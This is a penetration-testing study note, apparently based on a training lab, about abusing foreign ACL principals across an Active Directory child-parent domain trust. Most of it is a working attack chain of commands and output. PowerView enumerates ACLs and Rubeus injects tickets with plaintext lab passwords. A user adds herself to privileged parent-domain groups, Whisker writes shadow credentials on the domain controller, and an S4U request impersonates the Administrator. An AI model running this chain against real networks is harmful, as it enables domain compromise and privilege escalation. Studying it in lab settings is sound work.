## What are?
Basically are `users` who are members of `groups` located outside of the user's `current domain`.

## Preface of AD groups
AD groups can be part of 3 different scopes:

|**Scope**|**Possible Members**|
|---|---|
|`Universal`|Accounts from any domain in the same forest, Global groups from any domain in the same forest and other Universal groups from any domain in the same forest.|
|`Global`|Accounts from the same domain and Other Global groups from the same domain.|
|`Domain Local`|Accounts from any domain or any trusted domain, Global groups from any domain or any trusted domain, Universal groups from any domain in the same forest, Other Domain Local groups from the same domain. Accounts, Global groups, and Universal groups from other forests and from external domains.|
From this table, it becomes evident that within the Active Directory structure, the parent domain possesses the capability to include users from a child domain within either `Universal` or `Domain Local` groups of the parent domain. This capability stems from the fact that `Global` groups are restricted to containing users from the `same domain`. Therefore, to facilitate broader resource access and permissions management across domains within the `same forest`, Universal and Domain Local groups serve as effective mechanisms for incorporating users from child domains into the parent domain's group structure.

## Foreign ACL Principals
It is possible to have interesting ACL for User and Group object of a Child domain over a Parent one(taking advantages of the Trust between domains).
### Enumerate Foreign ACL Principals
In this example can we appure that DEV/RITA(Child domain) have a GenericAll over the INLANEFREIGHT/Infrastructure(Parent domain) group.
```powershell-session
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid rita
Get-DomainObjectAcl -ResolveGUIDs -Identity * -domain inlanefreight.ad | ? {$_.SecurityIdentifier -eq $sid}

AceType               : AccessAllowed
ObjectDN              : CN=Infrastructure,CN=Users,DC=INLANEFREIGHT,DC=AD
ActiveDirectoryRights : GenericAll
OpaqueLength          : 0
ObjectSID             : S-1-5-21-2879935145-656083549-3766571964-2110
InheritanceFlags      : None
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-2901893446-2198612369-2488268719-2103
AccessMask            : 983551
AuditFlags            : None
AceFlags              : None
AceQualifier          : AccessAllowed  
```

### Abusing Foreign ACL Principals
We will create a sacrificial session in order to not mess up with klist tickets.
```powershell-session
./Rubeus createnetonly /program:powershell.exe /show
```
Request and inject into the sacrificial session the TGT ticket for Rita(she is part of the foreign group).
```powershell-session
 .\Rubeus.exe asktgt /user:rita /password:rita /domain:dev.inlanefreight.ad /ptt
```
And add herself to the Infrastructure group(aka the Foreign group).
```powershell-session
Add-DomainGroupMember -identity 'Infrastructure' -Members 'DEV\rita' -Domain inlanefreight.ad -Verbose
```

### Enumerate Foreign ACLs for all Users
This PowerShell script will use *Powerview.ps1* to enumerate the Foreign groups ACL for all the users in the Parent Domain.
```powershell
$Domain = "inlanefreight.ad"
$DomainSid = Get-DomainSid $Domain

Get-DomainObjectAcl -Domain $Domain -ResolveGUIDs -Identity * | ? { 
	($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner') -and `
	($_.AceType -match 'AccessAllowed') -and `
	($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and `
	($_.SecurityIdentifier -notmatch $DomainSid)
} 
```
The tool will response back only in SID code that need to be converted back!
```powershell-session
//Result
AceType               : AccessAllowed
ObjectDN              : CN=Enterprise Key Admins,CN=Users,DC=INLANEFREIGHT,DC=AD
ActiveDirectoryRights : GenericAll
OpaqueLength          : 0
ObjectSID             : S-1-5-21-2879935145-656083549-3766571964-527
InheritanceFlags      : ContainerInherit
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-2901893446-2198612369-2488268719-2106
AccessMask            : 983551
AuditFlags            : None
AceFlags              : ContainerInherit
AceQualifier          : AccessAllowed

//Convert the SID of the user
PS C:\Tools> ConvertFrom-SID S-1-5-21-2901893446-2198612369-2488268719-2106
DEV\sentinal
```
Now it is clear that the **DEV/Sentinal(Child Domain)** can *GenericAll* over the **INLANEFREIGHT/Enterprise Key Admins(Parent Domain)**.
Again, we need to request and inject the TGT for *Sentinal*.
```powershell-session
.\Rubeus.exe asktgt /user:sentinal /password:sentinal /ptt
```
Add ourself to the *Foreign* group on *Parent domain* since we have full access to it...
```powershell-session
Add-DomainGroupMember -identity 'Enterprise Key Admins' -Members 'DEV\sentinal' -Domain inlanefreight.ad -Verbose
```
`Enterprise Key Admins`, Members have the ability to write to the “msds-KeyCredentialLink” property on a user or computer.
```powershell-session
.\Whisker.exe add /target:DC01$ /domain:inlanefreight.ad
```
Now request a TGT for the DC01$(Parent DC).
```powershell-session
.\Rubeus.exe asktgt /user:DC01$ /certificate:MIIJuAIBAzCCCXQGCSqGSIb3DQEHAaCCCWUEgglhMIIJXTCCBhYGCSqGSIb3DQEHAaCCBgcEggYDMIIF/zCCBfsGCyqGSIb3DQEMCgECoIIE/jCCBPowHAYKKoZIhvcNAQwBAzAOBAie+9JkzabX6wICB9AEggTYCYh0TmqdYlJyoQ5moyO/ngfA2h1gZ6B31ep2zXl/wZaSf8uHXCX2Jv+Pc6mnyH4/GO746mcPzmllTQSpLKDdXB6U0aAB6/q1/GALrgYnuJkK3AcQLeRruB0HCxmyLqju2TUvLggM6kE0zvDyvpYp5m1NPacAQrgFmJS8Dpr0CYUOQBtB2tKmLFvTLoeQIl4nbJAncn5Lj+jPjQ512S481ESPz4lK9zz6waO6Yk9FdHc3aCes492qA/D1Y6PK7BSnAbHuluvlzmVBdUo14k7IZRVUYq1Xpxi5ZdHR3SmgfEURfKYfogl8FsbmHVq4ZDVAdn2IHmUXZ6yVKuKsDar6ayIwBNEI3UPJpUAkHOO/BKGeSbihlEktILMSN+LT0Xe97C6aH+nedZa80tC638QEdIzc4z1A8scjVguvHTKpwBoxGwflrU34Lp951oo70pRb/JHRX2Z4l01MmzpS0ktbILTsTFHnHpSz6lLakhT2P24Kq5YbWfI3GmHoMIWuJxY6nUOGKYaU6T7uOPyK8dk0Fp08j3Lva1PM1mnE+RxUO+N2bwCZ6FbDUoVNCT0TrbXivj41eob<SNIP>" /domain:inlanefreight.ad /dc:DC01.INLANEFREIGHT.AD /getcredentials /show
```
Lastly abuse the S4U2Proxy to request an impersonation of a *User(Administrator)* from a Service.
```powershell-session
.\Rubeus.exe s4u /dc:DC01.inlanefreight.ad /ticket:doIGbDCCBmigAwIBBaEDAgEWooIFeDCCBXRhggVwMIIFbKADAgEFoRIbEElOTEFORUZSRUlHSFQuQUSiJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEGlubGFuZWZyZWlnaHQuYWSjggUoMIIFJKADAgESoQMCAQKiggUWBIIFEkqnq24wD+zmheCFis5fwRH3z0sI5RUgAgLtQGYO/Bwc<SNIP> /impersonateuser:administrator@inlanefreight.ad /ptt /self /service:host/DC01.inlanefreight.ad /altservice:cifs/DC01.inlanefreight.ad
```
With this in session you can take your attacks even further into the AD environment.